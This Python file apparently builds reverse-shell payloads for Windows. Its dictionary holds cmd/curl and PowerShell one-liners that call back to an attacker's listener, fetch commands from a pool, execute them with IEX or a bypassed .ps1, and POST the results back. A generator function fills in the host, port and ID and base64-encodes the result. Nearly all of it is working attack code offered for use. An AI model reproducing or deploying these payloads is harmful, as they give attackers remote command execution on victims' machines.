import string
import random
import base64

# $init$ - initiate
# $pool$ - where to make the request to view the command pool
# $resp$ - where to POST the response

# $ip$ - ip of listener
# $port$ - port of listener

# $pid$ - id of individual payload

# $http$ - http or https
payloads = { # the MASSIVE payloads, stolen and slightly edited from revshells.com
    "hoax-cURL": '@echo off&cmd /V:ON /C "SET ip=$ip$:$port$&&SET sid="Authorization: $pid$"&&SET protocol=$http$&&curl !protocol!!ip!/$init$ -H !sid! > NUL && for /L %i in (0) do (curl -s !protocol!!ip!/$pool$ -H !sid! > !temp!cmd.bat & type !temp!cmd.bat | findstr None > NUL & if errorlevel 1 ((!temp!cmd.bat > !tmp!out.txt 2>&1) & curl !protocol!!ip!/$resp$ -X POST -H !sid! --data-binary @!temp!out.txt > NUL)) & timeout 1" > NUL',
    "hoax-iex": "$s='$ip$:$port$';$i='$pid$';$p='$http$';$v=IRM -UseBasicParsing -Uri $p$s/$init$ -Headers @{\"Authorization\"=$i};while ($true){$c=(IRM -UseBasicParsing -Uri $p$s/$pool$ -Headers @{\"Authorization\"=$i});if ($c -ne 'None') {$r=IEX $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=IRM -Uri $p$s/2f810c1e -Method POST -Headers @{\"Authorization\"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}",
    "hoax-iex-constrained": '$s="$ip$:$port$";$i="$pid$";$p="$http$";$v=IRM -UseBasicParsing -Uri $p$s/$init$ -Headers @{"Authorization"=$i};while ($true){$c=(IRM -UseBasicParsing -Uri $p$s/$pool$  -Headers @{"Authorization"=$i});if ($c -ne "None") {$r=IEX $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=IRM -Uri $p$s/$resp$ -Method POST -Headers @{"Authorization"=$i} -Body ($e+$r)} sleep 0.8}',
    "hoax-iex-outfile": '$s="$ip$:$port$";$i="$pid$";$p="$http$";$f="C:Users$env:USERNAME.localhack.ps1";$v=Invoke-RestMethod -UseBasicParsing -Uri $p$s/$init$ -Headers @{"Authorization"=$i};while ($true){$c=(Invoke-RestMethod -UseBasicParsing -Uri $p$s/$pool$  -Headers @{"Authorization"=$i});if ($c -eq "exit") {del $f;exit} elseif ($c -ne "None") {echo "$c" | out-file -filepath $f;$r=powershell -ep bypass $f -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-RestMethod -Uri $p$s/2f810c1e -Method POST -Headers @{"Authorization"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}',
    "hoax-iex-const-out": '$s="$ip$:$port$";$i="$pid$";$p="$http$";$f="C:Users$env:USERNAME.localhack.ps1";$v=IRM -UseBasicParsing -Uri $p$s/$init$ -Headers @{"Authorization"=$i};while ($true){$c=(IRM -UseBasicParsing -Uri $p$s/$pool$  -Headers @{"Authorization"=$i}); if ($c -eq "exit") {del $f;exit} elseif ($c -ne "None") {echo "$c" | out-file -filepath $f;$r=powershell -ep bypass $f -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=IRM -Uri $p$s/$resp$ -Method POST -Headers @{"Authorization"=$i} -Body ($e+$r)} sleep 0.8}'
}

def createUID(): # generate a simple 16char id
    return ''.join([random.choice(string.ascii_uppercase) for x in range(24)])

def genPayload(pType:str, ip:str, port:int, method:str="http://",
                init:str="e030d4f6", cmdPool:str="9393dc2a", response:str="dd9e00a7"):
    
    if pType not in payloads:
        raise KeyError("payload not valid - must be one of: " + str(list(payloads)))
    
    payload = payloads[pType]

    pid = createUID()

    replaces = [
        ("$init$", init),
        ("$pool$", cmdPool),
        ("$resp$", response),

        ("$ip$", ip),
        ("$port$", str(port)),

        ("$pid$", pid),

        ("$http$", method),
    ]

    for x in replaces:
        payload = payload.replace(x[0], x[1], 1)

    return {
        "original": payload, # original payload
        "base64": base64.b64encode(payload.encode('ascii')).decode('ascii'), # base64 encoded payload
        "payloadId": pid
    }